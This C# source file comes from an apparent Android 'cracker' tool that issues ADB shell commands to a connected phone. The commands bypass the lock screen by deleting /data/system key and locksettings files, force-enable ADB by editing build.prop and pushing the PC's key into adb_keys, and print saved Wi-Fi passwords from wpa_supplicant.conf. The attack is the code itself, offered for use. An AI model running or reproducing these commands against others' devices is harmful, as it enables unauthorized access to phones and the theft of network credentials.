﻿using SMPHCracker.Model;
using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Text.RegularExpressions;
using System.Threading.Tasks;

namespace SMPHCracker.Logic
{
    class Cracker : ICracker
    {
        public Status GetStatus()
        {
            //TODO Dictionary Declaration need to be somewhere else
            Dictionary<String,Status> dic = new StatusDictionary().GetStatusDictionary();

            String output = ADB.Execute(ADBCommands.DEVICES);

            dic.TryGetValue(dic.Keys.FirstOrDefault(k => output.Contains($"{k}\r")) ?? "nodevice", out Status status);

            return status != Status.ADB ? status : ADB.Execute(ADBCommands.SHELLROOT).Contains("denied") ? Status.ADB : Status.Root;

            //Didn't work!
            //Christian
            //String output = ADB.Execute(ADBCommands.DEVICES);
            //
            ////Auslesen des Status aus dem output
            //Status status = dic[dic.Keys.FirstOrDefault(k => Regex.IsMatch(output, @"(" + k + ")")).ToString()];
            //
            ////Status überprüfen
            //status = status != Status.Root ? status : Regex.IsMatch(ADB.Execute(ADBCommands.SHELLROOT),@"?(error) error| denied") ? Status.ADB : status;
            //
            //return status;


            //Alt
            //String output = ADB.Execute(ADBCommands.DEVICES);
            //
            ////TODO - use LINQ to cut out -> device || unauthorized || recovery || sideload
            //output = String.IsNullOrWhiteSpace(output) ? String.Empty : string.Join(" ", Regex.Split(output, @"(?:\r\n|\n|\r|\t)")).Split(' ')[5];
            //
            //switch (output)
            //{
            //    case "unauthorized":
            //        return Status.Unauthorized;
            //
            //    case "device":
            //        output = ADB.Execute(ADBCommands.SHELLROOT); 
            //
            //        if(output.Contains("error") || output.Contains("denied"))
            //            return Status.ADB;
            //        else
            //            return Status.Root;
            //
            //    case "recovery":
            //        return Status.Recovery;
            //
            //    case "sideload":
            //        return Status.Sideload;
            //
            //    default:
            //        return Status.NoDevice;
            //}
        }

        public string GetBezeichnung()
        {
            return $"{ADB.Execute(ADBCommands.GETPROP, "ro.product.brand")} {ADB.Execute(ADBCommands.GETPROP, "ro.product.model")}";
        }

        public bool RemovePassoword(Status status)
        {
            switch (status)
            {
                case Status.Root:
                    //Check if .key file exists
                    if (!(ADB.Execute(ADBCommands.SHELLROOT, "ls /data/system/*.key > /dev/null 2>&1 && echo 'true' || echo 'false'").Contains("true")))
                        return false;

                     ADB.Execute(ADBCommands.SHELLROOT, "mount data");
                    //Remove LockScreen
                    ADB.Execute(ADBCommands.SHELLROOT, "rm /data/system/*.key");
                    //Reset LockSettings (optional -> prevent crash in Phone-Settings)
                    ADB.Execute(ADBCommands.SHELLROOT, "rm /data/system/locksettings*");

                    //Check if .key file not exists
                    if (ADB.Execute(ADBCommands.SHELLROOT, "ls /data/system/*.key > /dev/null 2>&1 && echo 'true' || echo 'false'").Contains("false"))
                        return true;
                    else
                        return false;

                case Status.Recovery:
                    //Check if .key file exists
                    if (!(ADB.Execute(ADBCommands.SHELL, "ls /data/system/*.key > /dev/null 2>&1 && echo 'true' || echo 'false'").Contains("true")))
                        return false;

                    ADB.Execute(ADBCommands.SHELL, "mount data");
                    //Remove LockScreen
                    ADB.Execute(ADBCommands.SHELL, "rm /data/system/*.key");
                    //Reset LockSettings (optional -> prevent crash in Phone-Settings)
                    ADB.Execute(ADBCommands.SHELL, "rm /data/system/locksettings*");

                    //Check if .key file not exists
                    if (ADB.Execute(ADBCommands.SHELL, "ls /data/system/*.key > /dev/null 2>&1 && echo 'true' || echo 'false'").Contains("false"))
                        return true;
                    else
                        return false;

                case Status.Sideload:
                    return RemovePasswordSideload();

                default:
                    return false;
            }
        }
        private bool RemovePasswordSideload()
        {
            return false;
        }

        public bool EnableADB(Status status)
        {
            switch (status)
            {
                case Status.Recovery:
                    //TODO - check if enabling ADB was successfully

                    //Add ADB-Settings
                    ADB.Execute(ADBCommands.SHELL, "mount data");
                    ADB.Execute(ADBCommands.SHELL, "\"echo -n 'mtp,adb' > /data/property/persist.sys.usb.config\"");
                    //Activates ADB-Settings
                    ADB.Execute(ADBCommands.SHELL, "mount system");
                    ADB.Execute(ADBCommands.SHELL, "\"echo '' >> /system/build.prop\"");
                    ADB.Execute(ADBCommands.SHELL, "\"echo '#Enable ADB with Cracker \' >> /system/build.prop\"");
                    ADB.Execute(ADBCommands.SHELL, "\"echo 'persist.service.ADB.enable=1' >> /system/build.prop\"");
                    ADB.Execute(ADBCommands.SHELL, "\"echo 'persist.service.debuggable=1' >> /system/build.prop\"");
                    ADB.Execute(ADBCommands.SHELL, "\"echo 'persist.sys.usb.config=mtp,adb' >> /system/build.prop\"");

                    return true;

                case Status.Sideload:
                    return EnableADBSideload();

                default:
                    return false;
            }
        }
        private bool EnableADBSideload()
        {
            return false;
        }

        public bool VerifyADB(Status status)
        {
            if (status == Status.Recovery)
            {
                //TODO - get adkey.pub from folder .android
                //TODO - check if vertifying PC was successfully

                //Vertify PC for ADB
                ADB.Execute(ADBCommands.PUSH, @"C:\Users\ErdnüßFrederic\.android\adbkey.pub", "/data/misc/adb/adb_keys");

                return true;
            }
            else if(status == Status.Sideload)
            {
                return VertifyADBSideload();
            }

            return false;
        }
        private bool VertifyADBSideload()
        {
            return false;
        }

        public string ShowWLANKeys(Status status)
        {
            switch (status)
            {
                case Status.Root:
                    //Show WLAN-Keys
                    return ADB.Execute(ADBCommands.SHELLROOT, "cat /data/misc/wifi/wpa_supplicant.conf");

                case Status.Recovery:
                    //Show WLAN-Keys
                    return ADB.Execute(ADBCommands.SHELL, "cat /data/misc/wifi/wpa_supplicant.conf");

                default:
                    return "false";
            }
        }
    }
}
